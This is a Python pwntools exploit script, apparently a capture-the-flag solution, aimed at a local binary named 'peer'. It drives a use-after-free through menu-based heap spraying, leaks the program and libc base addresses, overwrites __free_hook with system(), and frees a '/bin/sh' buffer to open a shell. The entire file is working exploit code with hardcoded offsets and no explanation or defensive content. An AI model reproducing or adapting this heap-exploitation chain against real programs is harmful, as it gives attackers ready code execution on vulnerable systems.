#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

while 1:
    p = process("./peer")

    p.recvuntil("> ")

    def alloc(idx, rdata, wdata):

        p.sendline("1")
        p.recvuntil("index? ")
        p.sendline(str(idx))
        time.sleep(0.1)
        p.send(rdata)
        time.sleep(0.1)
        p.send(wdata)
        p.recvuntil("> ")

    def delete(idx):

        p.sendline("2")
        p.recvuntil("index? ")
        p.sendline(str(idx))
        p.recvuntil("> ")

    def use(idx):

        p.sendline("3")
        p.recvuntil("index? ")
        p.sendline(str(idx))
        data = p.recvuntil("> ")
        return data

    def gc():

        p.sendline("4")
        p.recvuntil("> ")

    def spray(rdata, wdata):

        p.sendline("5")
        time.sleep(0.1)
        p.send(rdata)
        time.sleep(0.1)
        p.send(wdata)
        p.recvuntil("> ")
        
    #a great UAF in browser emulating process.

    #allocate first.

    alloc(0, "a" * 256, "b" * 16)
    delete(8)
    gc()
    #spray!
    for i in range(8):

        spray("read" * 64, "binaryfang" + "\x00" * 6)

    #Use!
    try:
        data = use(0)
    except:
        print "[*]Segfault.."
        continue
    if  data.index("[*]menu") > 10:
        #hit!
        print "[*]Hit!"
        leak_bin = data[:6]
        binary = u64(leak_bin.ljust(8, "\x00")) - 0x1228
        print hex(binary)
        
        #spray second time, this time give me libc!
        alloc(1, "a" * 256, "b" * 16)
        delete(9)
        gc()
        wait("me")

        spray_chunk = p64(binary + 0x1280) + p64(0x121) + p64(binary + 0x202090) + p64(0x100)
        for x in range(8):

            spray( spray_chunk * 8, "a" * 16)

        p.sendline("3")
        p.recvuntil("index? ")
        #leak
        p.sendline("1")
        p.recvuntil("what?")

        construct = p64(binary + 0x201fb0) + p64(binary + 0x201fd0)
        construct += "a" * 0x20 + p64(binary + 0x1275)
        construct = construct.ljust(0x40, "\x00")
        construct += p64(binary + 0x2020d0) + p64(0x8)
        construct += p64(binary + 0x1280)
        construct = construct.ljust(0x100, "\x00")
        p.send(construct)
        #leak libc.
        p.recvuntil("> ")
        p.sendline("3")
        p.recvuntil("index? ")
        p.sendline("2")
        data = p.recvuntil("> ")
        libc = u64(data[:6].ljust(8,"\x00")) - 0x84130
        print hex(libc)
        wait("me")
        system = libc + 0x45390
        free_hook = libc + 0x3c67a8
        p.sendline("3")
        p.recvuntil("idx? ")
        p.sendline("3")
        p.recvuntil("data?")
        p.send(p64(free_hook))
        p.recvuntil("> ")
        p.sendline("3")
        p.recvuntil("idx? ")
        p.sendline("3")
        p.recvuntil("data?")
        p.send(p64(system))
        p.recvuntil("> ")
        alloc(6, "/bin/sh\x00" + "a" * 248, "b" * 16)
        p.sendline("2")
        p.recvuntil("idx? ")
        p.sendline("8")
        p.recvuntil("> ")
        p.sendline("4")
        p.interactive()
    else:
        print "[*]Not hit!"
        p.close()
        continue

